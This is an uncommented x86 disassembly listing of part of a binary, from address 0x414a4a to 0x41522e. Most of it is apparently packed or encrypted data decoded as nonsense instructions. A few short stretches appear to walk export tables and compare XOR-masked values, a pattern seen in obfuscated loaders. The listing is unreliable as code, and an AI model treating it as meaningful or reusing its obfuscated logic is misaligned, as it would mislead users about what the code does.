  414a4a:	push   ecx
  414a4b:	or     edi,esi
  414a4d:	xchg   DWORD PTR [edi],esp
  414a4f:	adc    esp,ebp
  414a51:	cmp    BYTE PTR [ebx-0x7d4674f3],dh
  414a57:	xchg   DWORD PTR [edx],edi
  414a59:	(bad)  
  414a5a:	sbb    eax,0xe2dd3fdd
  414a5f:	dec    ebx
  414a60:	adc    esi,DWORD PTR [ecx+0x112d3d05]
  414a66:	jmp    0x414a47
  414a68:	inc    eax
  414a69:	clc    
  414a6a:	leave  
  414a6b:	sub    al,0x66
  414a6d:	mov    eax,ebx
  414a6f:	ret    
  414a70:	and    BYTE PTR [esp+esi*4+0x25],cl
  414a74:	int    0x56
  414a76:	aad    0xed
  414a78:	outs   dx,DWORD PTR ds:[esi]
  414a7a:	cli    
  414a7b:	or     eax,0x5b675dfd
  414a80:	xor    DWORD PTR [eax],0x27
  414a83:	dec    esp
  414a84:	or     BYTE PTR [ebx+edx*4],bl
  414a87:	ror    DWORD PTR [edx+edi*4+0x2282e672],0x8e
  414a8f:	or     edx,DWORD PTR [esi+0x33]
  414a92:	inc    edi
  414a93:	add    ah,0xef
  414a96:	sbb    DWORD PTR [esi],eax
  414a98:	in     eax,dx
  414a99:	and    BYTE PTR [esi+0x78],ch
  414a9c:	frstpm(287 only) 
  414a9e:	(bad)  
  414a9f:	leave  
  414aa0:	push   ds
  414aa1:	fimul  WORD PTR [edx+0x6c]
  414aa4:	fstp   DWORD PTR [edi]
  414aa6:	inc    ebx
  414aa7:	pusha  
  414aa8:	xor    al,0x40
  414aaa:	inc    edx
  414aab:	cmc    
  414aac:	shl    DWORD PTR [ecx+0x64],cl
  414aaf:	and    dl,cl
  414ab1:	stc    
  414ab2:	call   0x7f6c:0xb88d0a55
  414ab9:	stc    
  414aba:	sub    al,0x30
  414abc:	retf   
  414abd:	mul    BYTE PTR [esi]
  414abf:	xor    eax,DWORD PTR [edi]
  414ac1:	inc    ebx
  414ac2:	std    
  414ac3:	xor    dh,BYTE PTR [edi-0x7]
  414ac6:	fcom   DWORD PTR [ebx+eiz*8]
  414ac9:	adc    ebp,DWORD PTR [ebx+0x312b32b5]
  414acf:	or     BYTE PTR [eax],ah
  414ad1:	es push ebx
  414ad3:	fdivr  QWORD PTR [ecx]
  414ad5:	jno    0x414af7
  414ad7:	popf   
  414ad8:	mov    dh,0x4a
  414ada:	cld    
  414adb:	cmp    al,bl
  414add:	pushf  
  414ade:	inc    edx
  414adf:	add    al,0x4b
  414ae1:	loope  0x414a90
  414ae3:	fcomip st,st(5)
  414ae5:	rcr    BYTE PTR [ecx+0x1d0c8b25],1
  414aeb:	push   ecx
  414aec:	int    0x5b
  414aee:	cmp    ecx,ecx
  414af0:	pop    esp
  414af1:	mov    al,ds:0x4bbe218e
  414af6:	mov    bh,0x8d
  414af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af9:	push   0x8cea9768
  414afe:	pusha  
  414aff:	ret    
  414b00:	mov    ch,0x4d
  414b02:	lds    ecx,FWORD PTR [ebp-0x10d24c06]
  414b08:	outs   dx,DWORD PTR ds:[esi]
  414b09:	mov    ebx,0xf8ab4da7
  414b0e:	mov    bh,0x16
  414b10:	lods   eax,DWORD PTR ds:[esi]
  414b11:	lock aam 0xe0
  414b14:	out    0xa7,al
  414b16:	imul   edi,DWORD PTR [ebp-0x7344b19b],0xffffffff
  414b1d:	adc    ch,BYTE PTR [ecx-0x4c748c99]
  414b23:	repz xchg edx,eax
  414b25:	xchg   ebx,eax
  414b26:	js     0x414b59
  414b28:	shr    al,1
  414b2a:	lock lock cmp eax,0x617d214
  414b31:	push   eax
  414b32:	out    dx,al
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	icebp  
  414bb7:	pusha  
  414bb8:	sub    ebp,0x707f7b5b
  414bbe:	mov    ecx,0x1b70707e
  414bc3:	(bad)  
  414bc4:	pusha  
  414bc5:	not    ecx
  414bc7:	mov    ds:0xf17a9185,eax
  414bcc:	ficom  DWORD PTR [eax]
  414bce:	jns    0x414c0c
  414bd0:	dec    edi
  414bd1:	dec    esp
  414bd2:	and    eax,0xea030a22
  414bd7:	js     0x414bdf
  414bd9:	sbb    esp,DWORD PTR [ebx+0x46]
  414bdc:	mov    dh,0x7a
  414bde:	xchg   edi,eax
  414bdf:	aam    0x60
  414be1:	jp     0x414c16
  414be3:	add    ah,BYTE PTR [ebx+0x34]
  414be6:	jg     0x414c3d
  414be8:	ins    BYTE PTR es:[edi],dx
  414be9:	xor    al,0x2c
  414beb:	adc    al,0x37
  414bed:	test   BYTE PTR [edx+0x3f],0xa9
  414bf1:	push   eax
  414bf2:	jnp    0x414bfe
  414bf4:	das    
  414bf5:	dec    eax
  414bf6:	mov    bh,0xab
  414bf8:	push   cs
  414bf9:	pushf  
  414bfa:	push   edi
  414bfb:	in     al,dx
  414bfc:	or     al,0x31
  414bfe:	pop    edx
  414bff:	xor    DWORD PTR [eax],ebx
  414c01:	mov    ch,0x1c
  414c03:	js     0x414c4a
  414c05:	pop    esp
  414c06:	fimul  WORD PTR [ebx+0x3f]
  414c09:	jg     0x414c6e
  414c0b:	out    dx,eax
  414c0c:	cs xchg esp,eax
  414c0e:	aam    0xe5
  414c10:	mov    bl,0x4
  414c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c13:	bound  esi,QWORD PTR ds:0x11362dc8
  414c19:	in     al,dx
  414c1a:	jne    0x414c27
  414c1c:	mov    cl,BYTE PTR [ecx]
  414c1e:	push   edx
  414c1f:	ja     0x414bbd
  414c21:	push   ss
  414c22:	ss cmp cl,ah
  414c25:	je     0x414c4a
  414c27:	add    BYTE PTR [edi+0x5a67eddf],ah
  414c2d:	mov    ebp,0x7fa2df35
  414c32:	lds    edx,FWORD PTR [edx]
  414c34:	fadd   QWORD PTR [ecx+0xe45e850]
  414c3a:	pop    esp
  414c3b:	inc    ebx
  414c3c:	add    BYTE PTR [ebp-0xf],bh
  414c3f:	lods   eax,DWORD PTR ds:[esi]
  414c40:	jno    0x414bd5
  414c42:	dec    eax
  414c43:	jge    0x414c78
  414c45:	mov    cl,0x5f
  414c47:	and    cl,BYTE PTR [ebx+ecx*8-0x5b]
  414c4b:	adc    al,0xc5
  414c4d:	arpl   WORD PTR [bp+si-0x3c],dx
  414c51:	pop    es
  414c52:	int3   
  414c53:	cmp    esp,DWORD PTR [ecx-0x10]
  414c56:	fidivr WORD PTR [eax+0x4073b494]
  414c5c:	mov    bh,0x8e
  414c5e:	jmp    DWORD PTR [edi]
  414c60:	mov    al,ds:0xd72e0b26
  414c65:	data16 adc dl,BYTE PTR [ecx+0x77]
  414c69:	int    0x80
  414c6b:	ss enter 0xb4c9,0xd5
  414c70:	xchg   esi,eax
  414c71:	ret    
  414c72:	cdq    
  414c73:	mov    bl,BYTE PTR [ecx-0x40488b26]
  414c79:	ins    DWORD PTR es:[edi],dx
  414c7a:	ret    0x8280
  414c7d:	test   DWORD PTR [ebx],0x668b66a2
  414c83:	lahf   
  414c84:	add    dh,al
  414c86:	jmp    0x414c72
  414c88:	sti    
  414c89:	inc    esp
  414c8a:	mul    DWORD PTR [ebp+ebp*4-0x7f]
  414c8e:	aaa    
  414c8f:	or     BYTE PTR [edi],bl
  414c91:	and    DWORD PTR [eax-0x41],ecx
  414c94:	sub    DWORD PTR [ecx*1-0x60cbfb4e],ebx
  414c9b:	cmp    cl,BYTE PTR [edx]
  414c9d:	in     eax,dx
  414c9e:	cmp    DWORD PTR [edi+0x42242ec2],esi
  414ca4:	xor    BYTE PTR [ebx+esi*2-0x51],ah
  414ca8:	sub    DWORD PTR [eax+0x483bf4f8],edi
  414cae:	gs cmc 
  414cb0:	aad    0x5d
  414cb2:	dec    edx
  414cb3:	jae    0x414c85
  414cb5:	dec    ecx
  414cb6:	xor    eax,0xa8635c99
  414cbb:	jmp    0xe298515e
  414cc0:	jnp    0x414ca7
  414cc2:	cdq    
  414cc3:	cmp    cl,BYTE PTR [ebx+edx*4+0x1245c8ee]
  414cca:	rol    BYTE PTR [edi+0xeca9190],1
  414cd0:	rol    BYTE PTR [edi+0x4c70e1f3],1
  414cd6:	xor    BYTE PTR [edx+edx*1-0x78a91096],cl
  414cdd:	nop
  414cde:	sub    al,0xf
  414ce0:	aam    0xb0
  414ce2:	mov    eax,ds:0x7e4cb89b
  414ce7:	sbb    al,0x5f
  414ce9:	cmp    al,0xdb
  414ceb:	xor    BYTE PTR [esi],bh
  414ced:	les    eax,FWORD PTR [ecx+0x7e]
  414cf0:	xor    BYTE PTR [esi],ah
  414cf2:	into   
  414cf3:	add    edx,DWORD PTR [esi]
  414cf5:	jae    0x414c89
  414cf7:	adc    al,0x9a
  414cf9:	fbstp  TBYTE PTR [edi]
  414cfb:	test   DWORD PTR [esi+0x28],eax
  414cfe:	inc    eax
  414cff:	mov    ch,0xed
  414d01:	fsubp  st(2),st
  414d03:	and    al,0xd4
  414d05:	pop    ecx
  414d06:	dec    ecx
  414d07:	loopne 0x414c9c
  414d09:	sub    BYTE PTR ds:0x567247b2,bl
  414d0f:	pop    es
  414d10:	mov    BYTE PTR [edi+0x64],ch
  414d13:	out    dx,eax
  414d14:	stos   DWORD PTR es:[edi],eax
  414d15:	in     al,0x0
  414d17:	pushf  
  414d18:	adc    al,0x81
  414d1a:	clc    
  414d1b:	push   cs
  414d1c:	test   BYTE PTR [ebx+0x55858d32],ah
  414d22:	xor    ebx,edi
  414d24:	cmp    DWORD PTR [ebp+0xdb3fb8c],ebx
  414d2a:	int    0x18
  414d2c:	mov    dh,BYTE PTR [ebx+0x4258c1f0]
  414d32:	pusha  
  414d33:	gs fcmovnu st,st(3)
  414d36:	xchg   ecx,eax
  414d37:	sub    DWORD PTR [edx],0xedfe9047
  414d3d:	outs   dx,DWORD PTR ds:[esi]
  414d3e:	and    DWORD PTR [edx-0x37675a93],ebx
  414d44:	and    eax,0xb2573c48
  414d49:	mov    ecx,0x13bf748b
  414d4e:	bts    DWORD PTR [edi],ebp
  414d51:	popa   
  414d52:	pop    edx
  414d53:	cmp    DWORD PTR [eax+0x41],esi
  414d56:	mov    ebp,0xbe1c1e4c
  414d5b:	push   edi
  414d5c:	mov    BYTE PTR [edi],cl
  414d5e:	mov    ds:0x70e365b0,eax
  414d63:	push   ebx
  414d64:	xchg   ecx,eax
  414d65:	loope  0x414d16
  414d67:	or     eax,0x5732861c
  414d6c:	les    esp,FWORD PTR [ecx-0x2b]
  414d6f:	add    BYTE PTR [eax-0x43a9f47c],bh
  414d75:	push   ds
  414d76:	into   
  414d77:	scas   eax,DWORD PTR es:[edi]
  414d78:	inc    dx
  414d7a:	adc    ah,dl
  414d7c:	es sbb eax,0xbb90c77f
  414d82:	cmp    ecx,DWORD PTR [edi]
  414d84:	repz (bad) 
  414d86:	in     eax,dx
  414d87:	inc    BYTE PTR [edx]
  414d89:	xchg   ebp,eax
  414d8a:	dec    eax
  414d8b:	xor    esi,eax
  414d8d:	sbb    dl,BYTE PTR [ebx-0x115a1169]
  414d93:	dec    ecx
  414d94:	imul   esi
  414d96:	jne    0x414d77
  414d98:	or     edx,ebp
  414d9a:	icebp  
  414d9b:	and    eax,0xf5338058
  414da0:	jmp    0xa100:0x75f8eb2
  414da7:	push   esp
  414da8:	ins    DWORD PTR es:[edi],dx
  414da9:	inc    ebx
  414daa:	gs mov ebx,0xf3e47927
  414db0:	or     esp,DWORD PTR [ecx+0x3990d633]
  414db6:	push   0xbeb76d32
  414dbb:	das    
  414dbc:	push   edi
  414dbd:	adc    al,0x6b
  414dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dc0:	jb     0x414d6e
  414dc2:	push   cs
  414dc3:	icebp  
  414dc4:	addr16 (bad) 
  414dc6:	ins    BYTE PTR es:[di],dx
  414dc8:	mov    eax,0xb3eb4624
  414dcd:	jmp    0x414d5c
  414dcf:	add    al,0x5
  414dd1:	sub    edx,DWORD PTR [ebp-0x7a89daf6]
  414dd7:	cmp    al,0x9a
  414dd9:	mov    eax,0x633770ad
  414dde:	repz les ebp,FWORD PTR [ebp-0x64fda3a6]
  414de5:	xor    ecx,DWORD PTR [esi-0x7e]
  414de8:	mov    esi,0xab3d9d7a
  414ded:	mov    ebp,0x92d076a6
  414df2:	jle    0x414e43
  414df4:	not    DWORD PTR [edi-0xcd44a10]
  414dfa:	retf   0x3b0a
  414dfd:	sbb    bl,al
  414dff:	jo     0x414e16
  414e01:	leave  
  414e02:	ins    DWORD PTR es:[edi],dx
  414e03:	fdiv   QWORD PTR [edx]
  414e05:	cmp    edx,esp
  414e07:	ja     0x414e4c
  414e09:	test   al,0x90
  414e0b:	adc    dh,BYTE PTR [ecx-0x438094f2]
  414e11:	push   cs
  414e12:	xchg   esp,eax
  414e13:	xchg   ecx,eax
  414e14:	shl    dl,cl
  414e16:	pushf  
  414e17:	pop    eax
  414e18:	sahf   
  414e19:	adc    eax,0xfada2ba4
  414e1e:	ret    
  414e1f:	lds    ecx,FWORD PTR [edx-0x32]
  414e22:	gs mov ah,0x62
  414e25:	jge    0x414db6
  414e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e28:	mov    BYTE PTR [ecx-0x5dd71284],bl
  414e2e:	(bad)  
  414e2f:	(bad)  
  414e31:	inc    esi
  414e32:	xchg   edx,eax
  414e33:	inc    eax
  414e34:	cmp    ch,BYTE PTR [esi+0x46]
  414e37:	xor    DWORD PTR [ecx],edx
  414e39:	cwde   
  414e3a:	(bad)  
  414e3b:	jmp    FWORD PTR [ebx+0x12e1dbb2]
  414e41:	xor    ecx,DWORD PTR [ecx]
  414e43:	fidiv  WORD PTR [ebx]
  414e45:	and    BYTE PTR [ebx],dl
  414e47:	and    eax,0x601b744c
  414e4c:	repnz test BYTE PTR [ecx+0x42c219a0],dh
  414e53:	jne    0x414df1
  414e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e56:	mov    ebp,0x6ee3cb17
  414e5b:	es retf 0x7516
  414e5f:	fisub  WORD PTR [ebx-0x20427519]
  414e65:	out    dx,al
  414e66:	add    ebx,esp
  414e68:	pop    ecx
  414e69:	mov    cl,0xd1
  414e6b:	adc    ebx,DWORD PTR [esi-0x56c5457b]
  414e71:	pop    esp
  414e72:	xlat   BYTE PTR ds:[ebx]
  414e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e74:	retf   
  414e75:	or     dh,dh
  414e77:	dec    ebp
  414e78:	out    dx,al
  414e79:	in     al,dx
  414e7a:	cmp    BYTE PTR [ebp-0x4e32670c],bl
  414e80:	sub    BYTE PTR [edx+0x72],ah
  414e83:	adc    edi,eax
  414e85:	popf   
  414e86:	add    ecx,DWORD PTR [eax+0x20]
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	cli    
  414ead:	cs push 0x7f78a435
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e39
  414eb9:	push   ebp
  414eba:	xchg   esi,eax
  414ebb:	xor    BYTE PTR [esi],ch
  414ebd:	sbb    ecx,0x863c9d78
  414ec3:	mov    ebp,0xf33b87b1
  414ec8:	mov    edx,0x511781b7
  414ecd:	pop    ds
  414ece:	pop    edi
  414ecf:	not    DWORD PTR [ecx-0x755e7764]
  414ed5:	sub    DWORD PTR [edi+0x55c69995],esp
  414edb:	pop    eax
  414edc:	and    eax,0x5504f525
  414ee1:	sbb    BYTE PTR [esi],bh
  414ee3:	jmp    DWORD PTR [eax+0x4ca166b9]
  414ee9:	sub    bh,al
  414eeb:	cld    
  414eec:	xlat   BYTE PTR ds:[ebx]
  414eed:	aam    0x9d
  414eef:	mov    al,ds:0x5122a567
  414ef4:	mov    dh,0x19
  414ef6:	popa   
  414ef7:	and    al,0x57
  414ef9:	push   eax
  414efa:	and    eax,0x12908b14
  414eff:	outs   dx,DWORD PTR ds:[esi]
  414f00:	jle    0x414ea7
  414f02:	adc    al,0xc7
  414f04:	jno    0x414ef8
  414f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f07:	std    
  414f08:	or     al,BYTE PTR [eax]
  414f0a:	retf   
  414f0b:	sbb    esp,DWORD PTR [eax-0x58b235cb]
  414f11:	adc    al,0x16
  414f13:	push   esp
  414f14:	lds    edi,FWORD PTR [ebp-0x6c14b6bd]
  414f1a:	cwde   
  414f1b:	cli    
  414f1c:	push   edx
  414f1d:	jle    0x414f78
  414f1f:	push   cs
  414f20:	or     eax,0x3f6f48f7
  414f25:	scas   eax,DWORD PTR es:[edi]
  414f26:	ja     0x414f77
  414f28:	fld    TBYTE PTR ss:[edx]
  414f2b:	or     edi,esp
  414f2d:	and    bl,BYTE PTR [ebx+0x1fd8c042]
  414f33:	mov    edi,0xc678b194
  414f38:	repnz rcr BYTE PTR [esi],1
  414f3b:	sub    DWORD PTR [ebx+0x529d61d],esp
  414f41:	sbb    al,0xb7
  414f43:	pop    ss
  414f44:	stc    
  414f45:	fyl2xp1 
  414f47:	push   edx
  414f48:	rol    DWORD PTR [bx+si],cl
  414f4b:	cmp    eax,0x67aa91da
  414f50:	aaa    
  414f51:	and    BYTE PTR [ebx+0x3bde7385],0x67
  414f58:	mov    ds:0x96062786,eax
  414f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5e:	sahf   
  414f5f:	das    
  414f60:	push   0xa28d43f5
  414f65:	daa    
  414f66:	adc    esi,0x1bfeb396
  414f6c:	lahf   
  414f6d:	push   esp
  414f6e:	sbb    cl,BYTE PTR [esi+0x15]
  414f71:	js     0x414fcd
  414f73:	add    cl,dl
  414f75:	fdiv   QWORD PTR [ecx+0x39bbf787]
  414f7b:	and    BYTE PTR [ecx+0x58],ch
  414f7e:	(bad)  
  414f7f:	jp     0x414fa0
  414f81:	sbb    al,BYTE PTR [ecx+0xe]
  414f84:	je     0x414f9f
  414f86:	mov    ah,0xb0
  414f88:	dec    ebp
  414f89:	or     eax,0xac88bb83
  414f8e:	scas   eax,DWORD PTR es:[edi]
  414f8f:	sbb    eax,0x33b5ea05
  414f94:	sub    DWORD PTR [esi-0x39],esi
  414f97:	push   ds
  414f98:	mov    bl,0x4c
  414f9a:	push   ecx
  414f9b:	sbb    al,BYTE PTR [eax-0x13c0ec31]
  414fa1:	mov    edi,0xa5805309
  414fa6:	and    DWORD PTR [ecx+0x2345467b],ebp
  414fac:	and    eax,0x5ae5efb9
  414fb1:	add    dl,BYTE PTR [edx+0x34ca1d03]
  414fb7:	adc    ah,bh
  414fb9:	sbb    bh,BYTE PTR [esi+0x65e25b97]
  414fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc0:	lds    edi,FWORD PTR [ebp+edx*4+0x16]
  414fc4:	into   
  414fc5:	and    BYTE PTR [ecx-0xc65a240],dl
  414fcb:	retf   0x6669
  414fce:	mov    ds:0x6774d3f0,al
  414fd3:	test   BYTE PTR [edi],al
  414fd5:	call   0x18b0:0x1e8fed2d
  414fdc:	and    edi,ebx
  414fde:	out    dx,al
  414fdf:	jmp    0x59bff8b
  414fe4:	pop    esi
  414fe5:	push   ecx
  414fe6:	mov    DWORD PTR [edx+0x33],ecx
  414fe9:	or     edx,DWORD PTR [eax-0x3626ab0d]
  414fef:	adc    ebp,DWORD PTR [edx+0x77322462]
  414ff5:	jo     0x41502a
  414ff7:	inc    esi
  414ff8:	retf   0x5820
  414ffb:	test   bl,al
  414ffd:	xor    DWORD PTR [edx-0x7ab29af7],edi
  415003:	dec    ecx
  415004:	mov    al,0x23
  415006:	sub    eax,0x3f13f3e8
  41500b:	ret    0xaa61
  41500e:	mov    ebp,0xd7f0d94a
  415013:	add    DWORD PTR [ebx-0x1f],ecx
  415016:	enter  0x1d6,0x90
  41501a:	dec    edx
  41501b:	xchg   si,ax
  41501d:	push   cs
  41501e:	jne    0x415008
  415020:	lods   al,BYTE PTR ds:[esi]
  415021:	shr    BYTE PTR gs:[edi+0x447c445b],cl
  415028:	xchg   ecx,eax
  415029:	jae    0x41503f
  41502b:	aaa    
  41502c:	jnp    0x414fcd
  41502e:	push   esi
  41502f:	push   esp
  415030:	pop    ss
  415031:	nop    esp
  415034:	xchg   ecx,eax
  415035:	push   ss
  415036:	adc    eax,0x46497910
  41503b:	sub    esp,DWORD PTR [edx-0x2dd8d995]
  415041:	push   eax
  415042:	(bad)
  415045:	xchg   esi,eax
  415046:	imul   ebp,DWORD PTR [esi+eiz*2+0x51],0x3
  41504b:	ret    0xfc1d
  41504e:	jo     0x415009
  415050:	sahf   
  415051:	inc    ebx
  415052:	lods   eax,DWORD PTR ds:[esi]
  415053:	jb     0x415050
  415055:	gs mov ebx,0x7a7c1252
  41505b:	popa   
  41505c:	idiv   DWORD PTR [edi-0x6a]
  41505f:	sti    
  415060:	xchg   edx,eax
  415061:	sbb    DWORD PTR [ecx],esp
  415063:	mov    ds:0xb720fe45,eax
  415068:	fistp  QWORD PTR [ecx+eax*8]
  41506b:	push   ebp
  41506c:	out    dx,eax
  41506d:	imul   esp,DWORD PTR ds:0x21d68ffe,0xffffffb4
  415074:	arpl   WORD PTR [esi+ecx*1+0x53f29d2e],di
  41507b:	xchg   DWORD PTR [edi-0x7b],edi
  41507e:	(bad)  
  41507f:	xchg   edx,eax
  415080:	das    
  415081:	push   edx
  415082:	cmc    
  415083:	outs   dx,DWORD PTR ds:[esi]
  415084:	(bad)  
  415085:	cld    
  415086:	pop    esi
  415087:	or     ebp,DWORD PTR [esi+0x24750843]
  41508d:	pop    ds
  41508e:	mov    ds:0x7a505250,eax
  415093:	call   0x5ef3:0x1a2d22f1
  41509a:	mov    ah,0x89
  41509c:	cmp    bl,BYTE PTR [edx-0x5f175580]
  4150a2:	or     dh,bh
  4150a4:	mov    bl,0x3e
  4150a6:	or     DWORD PTR [ecx],ecx
  4150a8:	pop    eax
  4150a9:	enter  0xf49e,0x45
  4150ad:	cdq    
  4150ae:	xchg   DWORD PTR [eax],ecx
  4150b0:	dec    ebp
  4150b1:	push   eax
  4150b2:	in     eax,0xa3
  4150b4:	scas   al,BYTE PTR es:[edi]
  4150b5:	xchg   ebx,eax
  4150b6:	mov    bh,0xed
  4150b8:	xor    al,0x54
  4150ba:	adc    dl,BYTE PTR [ecx+0x64b48781]
  4150c0:	cmp    BYTE PTR [eax+edi*2-0x59c69314],bh
  4150c7:	add    bh,BYTE PTR [ebp+0x333e1eee]
  4150cd:	mov    eax,0x91c5b823
  4150d2:	mov    cl,0x4b
  4150d4:	xchg   ebp,eax
  4150d5:	pop    ds
  4150d6:	pop    eax
  4150d7:	mov    ?,WORD PTR [eax+eax*1]
  4150da:	js     0x4150f6
  4150dc:	jle    0x4150f9
  4150de:	popf   
  4150df:	fdivp  st(0),st
  4150e1:	test   DWORD PTR [esi+eiz*2+0x3f],edx
  4150e5:	das    
  4150e6:	pop    esi
  4150e7:	mov    ecx,0xb8f8eb52
  4150ec:	dec    edx
  4150ed:	ret    
  4150ee:	push   0x25
  4150f0:	inc    edi
  4150f1:	lahf   
  4150f2:	loopne 0x415076
  4150f4:	sub    al,0xc
  4150f6:	les    edx,FWORD PTR ds:0x485c3326
  4150fc:	jne    0x415129
  4150fe:	jmp    0x88b121c6
  415103:	das    
  415104:	mov    DWORD PTR [eax],edi
  415106:	test   DWORD PTR [edx],esi
  415108:	dec    ebp
  415109:	mov    dh,0x64
  41510b:	sbb    eax,0xd5f3f6e2
  415110:	inc    esi
  415111:	dec    esi
  415112:	adc    BYTE PTR [ecx+0xb],bl
  415115:	mov    edx,0x83e7945f
  41511a:	mov    ebx,edi
  41511c:	out    0xf1,eax
  41511e:	sahf   
  41511f:	mov    BYTE PTR [ebp-0x47],bh
  415122:	lds    edi,FWORD PTR [ebx-0x4640b397]
  415128:	loopne 0x415183
  41512a:	(bad)  
  41512b:	mov    eax,gs
  41512d:	dec    esi
  41512e:	leave  
  41512f:	gs xchg ebx,eax
  415131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415132:	outs   dx,BYTE PTR ds:[esi]
  415133:	mov    bh,0x28
  415135:	xchg   edi,eax
  415136:	cmp    ch,ch
  415138:	jp     0x41511c
  41513a:	js     0x4150f2
  41513c:	cmp    DWORD PTR ds:0x2056261a,edi
  415142:	xchg   edi,eax
  415143:	mov    BYTE PTR [edx],dh
  415145:	inc    esi
  415146:	sahf   
  415147:	mov    eax,0xc85a4c6f
  41514c:	xchg   edi,eax
  41514d:	lahf   
  41514e:	mov    al,ds:0xe7e862d1
  415153:	cdq    
  415154:	mov    al,0x28
  415156:	jb     0x41511d
  415158:	xchg   edx,eax
  415159:	scas   al,BYTE PTR es:[edi]
  41515a:	test   eax,0x456614da
  41515f:	dec    ebx
  415160:	or     BYTE PTR [edx+0x1aad94a2],dh
  415166:	mov    ebx,0x93044b72
  41516b:	jo     0x415154
  41516d:	sbb    BYTE PTR [ecx-0x64918602],cl
  415173:	pop    sp
  415175:	mov    esi,0x94bbb86a
  41517a:	(bad)  
  41517b:	add    DWORD PTR [bp+di+0x71],0x6589e02b
  415183:	fmul   QWORD PTR [ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldenv [ebp-0x12f52e0d]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	pop    ds
  4151b1:	mov    ah,BYTE PTR [eax+0x87f1e1e]
  4151b7:	jge    0x415174
  4151b9:	aam    0x12
  4151bb:	out    dx,eax
  4151bc:	xlat   BYTE PTR ds:[ebx]
  4151bd:	cmp    ebp,esp
  4151bf:	pop    ecx
  4151c0:	jo     0x41518e
  4151c2:	mov    esi,0x12c9385d
  4151c7:	repnz pop es
  4151c9:	pop    ecx
  4151ca:	or     bh,cl
  4151cc:	pop    ebx
  4151cd:	out    0xb,al
  4151cf:	xchg   esp,eax
  4151d0:	dec    ebx
  4151d1:	(bad)  
  4151d2:	sbb    dh,BYTE PTR [edx+0x2c24d765]
  4151d8:	push   0xffffffc2
  4151da:	out    0x80,ax
  4151dd:	lds    ebp,FWORD PTR [eax-0x6d7a4af1]
  4151e3:	push   eax
  4151e4:	dec    ebx
  4151e5:	inc    ecx
  4151e6:	aam    0xca
  4151e8:	jbe    0x4151ce
  4151ea:	mov    ds,WORD PTR [edi-0x68]
  4151ed:	ins    DWORD PTR es:[edi],dx
  4151ee:	imul   eax,DWORD PTR [eax+0x7d9d4195],0x3e6015fb
  4151f8:	lods   ax,WORD PTR ds:[esi]
  4151fa:	jo     0x41525f
  4151fc:	xchg   BYTE PTR [edx+esi*1-0x50695e78],ch
  415203:	sub    al,0x96
  415205:	push   esi
  415206:	sahf   
  415207:	ins    DWORD PTR es:[edi],dx
  415208:	fisub  DWORD PTR [edx+0x18]
  41520b:	xor    al,BYTE PTR [edx+0x16]
  41520e:	bound  eax,QWORD PTR [ebx]
  415210:	push   edi
  415211:	add    al,BYTE PTR [eax-0x144bbaf6]
  415217:	fistp  QWORD PTR [edi-0x2df5a70b]
  41521d:	gs inc edi
  41521f:	int    0x29
  415221:	and    DWORD PTR ds:0xe8e284a2,ebx
  415227:	aaa    
  415228:	sbb    bh,BYTE PTR [edx+0x6c]
  41522b:	push   ss
  41522c:	shl    ch,cl
  41522e:	and    BYTE PTR [edx],bl
